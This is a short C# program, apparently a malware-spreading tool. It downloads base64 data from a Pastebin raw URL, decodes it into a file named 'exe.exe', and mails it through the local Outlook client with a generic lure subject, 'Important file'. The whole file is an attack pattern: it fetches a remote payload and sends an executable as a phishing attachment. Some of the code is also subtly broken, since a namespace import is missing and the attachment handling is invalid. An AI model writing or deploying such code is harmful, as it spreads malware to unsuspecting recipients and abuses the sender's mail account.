using System;
using Microsoft.Office.Interop.Outlook;

namespace OutlookSender
{
    class Program
    {
        static void Main(string[] args)
        {
            string pastebinUrl = "https://pastebin.com/raw/[PASTEBIN_ID]";
            string base64Code;
            using (WebClient client = new WebClient())
            {
                base64Code = client.DownloadString(pastebinUrl);
            }

            byte[] fileBytes = Convert.FromBase64String(base64Code);
            string fileName = "exe.exe";

            Application outlook = new Application();
            MailItem mail = (MailItem)outlook.CreateItem(OlItemType.olMailItem);
            mail.Subject = "Important file";
            mail.To = "recipient@example.com";
            mail.Body = "Please find attached the important file.";
            mail.Attachments.Add(fileName, Type.Missing, Type.Missing, Type.Missing);
            ((Attachment)mail.Attachments[1]).BinaryData = fileBytes;
            mail.Send();

            Console.WriteLine("File sent successfully via Outlook.");
        }
    }
}
